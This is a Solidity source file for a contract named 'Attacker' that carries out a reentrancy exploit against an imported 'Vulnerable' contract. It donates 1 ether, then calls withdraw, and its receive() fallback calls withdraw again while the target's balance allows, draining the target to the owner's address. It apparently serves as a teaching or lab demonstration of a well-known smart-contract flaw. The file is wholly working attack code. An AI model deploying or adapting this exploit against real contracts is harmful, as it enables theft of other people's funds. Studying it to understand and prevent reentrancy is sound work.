// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vul;
    address public owner;

    constructor(address _vulnerableAddress) {
        vul = Vulnerable(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function that gets triggered during reentrancy
    receive() external payable {
        if(address(vul).balance >= 1 ether) {
            vul.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        // Donate first
        vul.donate{value: 1 ether}();

        // Trigger reentrancy
        vul.withdraw(1 ether);
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}